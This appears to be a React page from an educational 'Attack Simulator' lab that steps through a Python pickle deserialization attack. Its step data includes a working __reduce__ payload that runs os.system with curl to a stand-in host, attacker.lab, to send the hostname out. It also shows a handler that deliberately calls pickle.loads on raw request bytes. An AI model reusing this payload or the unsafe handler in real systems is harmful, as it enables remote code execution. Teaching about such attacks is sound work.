'use client';

import React, { useState, useEffect, useCallback } from 'react';
import { ChevronLeft, ChevronRight, AlertTriangle, Shield, Zap } from 'lucide-react';
import { Card, CardHeader, CardBody } from '@/components/ui/Card';

interface AttackStep {
  step: number;
  title: string;
  subtitle: string;
  description: string;
  code: string;
  riskLabel: string;
  riskColor: string;
  detail: string;
}

const STEPS: AttackStep[] = [
  {
    step: 1,
    title: 'Attacker Crafts Payload',
    subtitle: 'Malicious serialized object constructed',
    description:
      'The attacker analyzes the target application to identify which deserialization endpoint is reachable. They craft a serialized object — in this case a Python pickle payload — that encodes a __reduce__ method referencing a dangerous callable (os.system). The bytes are indistinguishable from a legitimate serialized object.',
    code: `# Attacker workstation — simulation only
import pickle, os, base64

class MaliciousPayload:
    """Gadget: __reduce__ hook triggers on deserialization."""
    def __reduce__(self):
        # Returns (callable, args) — pickle will call:
        #   callable(*args) when deserializing
        cmd = "curl http://attacker.lab/callback?host=$(hostname)"
        return (os.system, (cmd,))

# Serialize to bytes
raw_bytes = pickle.dumps(MaliciousPayload())
b64_encoded = base64.b64encode(raw_bytes).decode()
# → 'gASVQwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC9jdXJsIGh0dHA...'`,
    riskLabel: 'PAYLOAD PREPARED',
    riskColor: 'text-serial-amber border-serial-amber/30 bg-serial-amber/10',
    detail: 'Gadget: __reduce__ → os.system()',
  },
  {
    step: 2,
    title: 'Object Transmitted',
    subtitle: 'Payload delivered over HTTP/network',
    description:
      'The encoded payload is submitted to the vulnerable endpoint. This could be an HTTP POST body, a URL parameter, a cookie, a message queue entry, or any other input vector the application trusts. The application receives raw bytes and passes them to the deserializer without validation.',
    code: `# HTTP request — lab simulation
POST /api/model/load HTTP/1.1
Host: target.internal:8080
Content-Type: application/octet-stream
Authorization: Bearer <valid-token>

<raw pickle bytes — 64 bytes>

# ─── Application receives bytes ───────────────────────
# Vulnerable handler:
def load_model(request):
    data = request.body          # attacker-controlled bytes
    obj  = pickle.loads(data)    # ← VULNERABLE LINE
    return JsonResponse({"status": "loaded"})

# No input validation. No type check. No allowlist.
# pickle.loads() executes __reduce__ before returning.`,
    riskLabel: 'IN TRANSIT',
    riskColor: 'text-serial-cyan border-serial-cyan/30 bg-serial-cyan/10',
    detail: 'Endpoint: POST /api/model/load',
  },
  {
    step: 3,
    title: 'Deserialization Begins',
    subtitle: 'Deserializer reconstructs the object graph',
    description:
      'The Python pickle module begins reading the opcode stream byte by byte. It encounters the GLOBAL opcode which resolves "posix" + "system" — a direct reference to os.system. The deserializer has no mechanism to distinguish legitimate objects from attacker-crafted ones; it faithfully follows the opcode stream.',
    code: `# Inside pickle.loads() — opcode stream walkthrough
# [Simulation: not actual CPython internals]

OPCODE STREAM:
  0x80 0x04          ← PROTO 4  (pickle protocol version)
  0x95 0x43 ...      ← FRAME    (framing header)
  0x8C 0x05          ← SHORT_BINUNICODE 5 chars
  posix              ← module name: "posix"
  0x8C 0x06          ← SHORT_BINUNICODE 6 chars
  system             ← attribute: "system"
  0x93               ← STACK_GLOBAL  → resolves: posix.system
  0x8C 0x39 ...      ← SHORT_BINUNICODE (the shell command)
  curl http://attacker.lab/callback?host=$(hostname)
  0x85               ← TUPLE1  → (cmd,)
  0x52               ← REDUCE  → calls: posix.system(cmd)
                                        ^^^^^^^^^^^^^^^^^^^
                                        EXECUTION HAPPENS HERE`,
    riskLabel: 'DESERIALIZING',
    riskColor: 'text-serial-violet border-serial-violet/30 bg-serial-violet/10',
    detail: 'REDUCE opcode triggers callable resolution',
  },
  {
    step: 4,
    title: 'Gadget Chain Fires',
    subtitle: 'Object graph resolves to dangerous callable chain',
    description:
      'The REDUCE opcode instructs pickle to call the resolved callable (os.system) with the provided arguments. This is the gadget chain: the attacker-specified callable chain is now executing inside the target process. The application receives an integer return code from os.system and proceeds normally, unaware that OS commands were executed.',
    code: `# Gadget chain resolution — lab simulation

Step 1: STACK_GLOBAL resolves "posix.system"
         pickle.find_class("posix", "system")
         → <built-in function system>

Step 2: TUPLE1 creates argument tuple
         → ("curl http://attacker.lab/callback?host=$(hostname)",)

Step 3: REDUCE calls the callable
         → os.system("curl http://attacker.lab/...")
         → Shell spawns: /bin/sh -c "curl http://attacker.lab/..."
         → Network request leaves target server

Step 4: os.system returns 0 (success)
         pickle.loads() returns 0 (int, not an object)
         Application: {"status": "loaded"}   ← response sent normally

# FROM THE APPLICATION'S PERSPECTIVE: NOTHING HAPPENED
# FROM THE ATTACKER'S PERSPECTIVE:     FULL CODE EXECUTION`,
    riskLabel: 'CHAIN ACTIVE',
    riskColor: 'text-orange-400 border-orange-500/30 bg-orange-500/10',
    detail: 'os.system() called with attacker args',
  },
  {
    step: 5,
    title: 'Code Execution Confirmed',
    subtitle: 'Out-of-band callback received — lab execution complete',
    description:
      'The target server made an outbound HTTP request to the attacker-controlled callback server. The hostname, environment, and user context are now known to the attacker. In a real attack this would be the foothold for privilege escalation, lateral movement, and data exfiltration. DEHYDRATE lab confirms the execution chain via its simulated OOB callback endpoint.',
    code: `# DEHYDRATE Callback Server — Lab Simulation
[14:32:17.441] CALLBACK RECEIVED ────────────────────────────────
  Source IP  : 10.0.0.47:51022
  User-Agent : curl/7.81.0
  Query Params:
    host     = "ml-training-server-prod"
    user     = "mlpipeline"
    uid      = "1001"
    pwd      = "/opt/models/training"

[14:32:17.442] EXECUTION CONFIRMED ──────────────────────────────
  Attack ID  : DEHYDRATE_LAB_EXECUTION_CONFIRMED
  Vector     : Python Pickle → __reduce__ → os.system
  Severity   : CRITICAL
  CVE Analog : CWE-502 / OWASP A08:2021

LAB SESSION COMPLETE ✓
All activity contained within authorized lab environment.`,
    riskLabel: 'EXECUTION CONFIRMED',
    riskColor: 'text-serial-crimson border-serial-crimson/40 bg-serial-crimson/10',
    detail: 'DEHYDRATE_LAB_EXECUTION_CONFIRMED',
  },
];

export default function AttackSimPage() {
  const [currentStep, setCurrentStep] = useState(0);
  const [animating, setAnimating] = useState(false);

  const goTo = useCallback((idx: number) => {
    if (idx < 0 || idx >= STEPS.length || animating) return;
    setAnimating(true);
    setTimeout(() => {
      setCurrentStep(idx);
      setAnimating(false);
    }, 180);
  }, [animating]);

  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === 'ArrowRight') goTo(currentStep + 1);
      if (e.key === 'ArrowLeft') goTo(currentStep - 1);
    };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [currentStep, goTo]);

  const step = STEPS[currentStep];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-serial-text">Attack Simulator</h1>
          <p className="text-xs font-mono text-serial-text-muted mt-1">
            Step-through deserialization attack chain · Use ← → arrow keys to navigate
          </p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-serial-amber/10 border border-serial-amber/25">
          <AlertTriangle size={12} className="text-serial-amber" />
          <span className="text-xs font-mono text-serial-amber">LAB SIMULATION ONLY</span>
        </div>
      </div>

      {/* Progress bar — step indicators */}
      <div className="flex items-center gap-2">
        {STEPS.map((s, i) => (
          <button
            key={s.step}
            onClick={() => goTo(i)}
            className="flex-1 group"
          >
            <div className={`h-1.5 rounded-full transition-all duration-300 ${i === currentStep ? 'bg-serial-violet' : i < currentStep ? 'bg-serial-emerald/60' : 'bg-serial-surface3'}`} />
            <div className={`text-[10px] font-mono mt-1 text-center transition-colors ${i === currentStep ? 'text-serial-violet' : i < currentStep ? 'text-serial-emerald/60' : 'text-serial-text-muted/40'}`}>
              {s.step}
            </div>
          </button>
        ))}
      </div>

      {/* Main step card */}
      <div
        className={`transition-opacity duration-180 ${animating ? 'opacity-0' : 'opacity-100'}`}
      >
        <Card>
          <div className="p-6 border-b border-serial-border">
            <div className="flex items-start justify-between">
              <div>
                <div className="flex items-center gap-3 mb-2">
                  <span className="text-xs font-mono text-serial-text-muted">STEP {step.step} / {STEPS.length}</span>
                  <span className={`text-xs font-mono px-2.5 py-0.5 rounded-md border ${step.riskColor}`}>
                    {step.riskLabel}
                  </span>
                </div>
                <h2 className="text-lg font-bold text-serial-text">{step.title}</h2>
                <p className="text-sm text-serial-text-secondary mt-1">{step.subtitle}</p>
              </div>
              {currentStep === STEPS.length - 1 && (
                <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-serial-crimson/15 border border-serial-crimson/30">
                  <Zap size={16} className="text-serial-crimson" />
                  <span className="text-xs font-mono text-serial-crimson font-semibold">CONFIRMED</span>
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-2 gap-0">
            {/* Left: description */}
            <div className="p-6 border-r border-serial-border">
              <div className="text-xs font-mono text-serial-text-muted mb-3 tracking-widest">WHAT IS HAPPENING</div>
              <p className="text-sm text-serial-text-secondary leading-relaxed">{step.description}</p>

              <div className="mt-6 p-3 rounded-xl border border-serial-border bg-serial-surface2">
                <div className="text-[10px] font-mono text-serial-text-muted mb-1">TECHNICAL DETAIL</div>
                <div className="text-xs font-mono text-serial-violet">{step.detail}</div>
              </div>
            </div>

            {/* Right: code */}
            <div className="p-0 bg-black/60">
              <div className="flex items-center gap-2 px-4 py-2.5 border-b border-serial-border bg-serial-surface/50">
                <span className="w-2.5 h-2.5 rounded-full bg-serial-crimson/70" />
                <span className="w-2.5 h-2.5 rounded-full bg-serial-amber/70" />
                <span className="w-2.5 h-2.5 rounded-full bg-serial-emerald/70" />
                <span className="text-xs font-mono text-serial-text-muted ml-2 tracking-widest">SIMULATION — NOT EXECUTABLE</span>
              </div>
              <pre className="p-5 text-xs font-mono text-serial-cyan leading-relaxed overflow-x-auto overflow-y-auto" style={{ maxHeight: '360px' }}>
                <code>{step.code}</code>
              </pre>
            </div>
          </div>
        </Card>
      </div>

      {/* Navigation */}
      <div className="flex items-center justify-between">
        <button
          onClick={() => goTo(currentStep - 1)}
          disabled={currentStep === 0}
          className="flex items-center gap-2 px-4 py-2 rounded-xl border border-serial-border text-serial-text-secondary hover:text-serial-text hover:border-serial-border-light transition-all disabled:opacity-30 disabled:cursor-not-allowed hover:scale-[1.02] active:scale-[0.98] font-mono text-sm"
        >
          <ChevronLeft size={16} />
          PREV STEP
        </button>

        <div className="text-xs font-mono text-serial-text-muted">
          {currentStep + 1} of {STEPS.length}
        </div>

        <button
          onClick={() => goTo(currentStep + 1)}
          disabled={currentStep === STEPS.length - 1}
          className="flex items-center gap-2 px-4 py-2 rounded-xl bg-serial-violet text-white hover:opacity-90 transition-all disabled:opacity-30 disabled:cursor-not-allowed hover:scale-[1.02] active:scale-[0.98] font-mono text-sm"
        >
          NEXT STEP
          <ChevronRight size={16} />
        </button>
      </div>

      {/* Disclaimer */}
      <div className="flex items-center gap-2 p-3 rounded-xl bg-serial-surface border border-serial-border">
        <Shield size={14} className="text-serial-emerald shrink-0" />
        <p className="text-xs font-mono text-serial-text-muted">
          All content is a simulation for educational research. No actual exploit code is present or executable. All scenarios are confined to the DEHYDRATE lab environment.
        </p>
      </div>
    </div>
  );
}
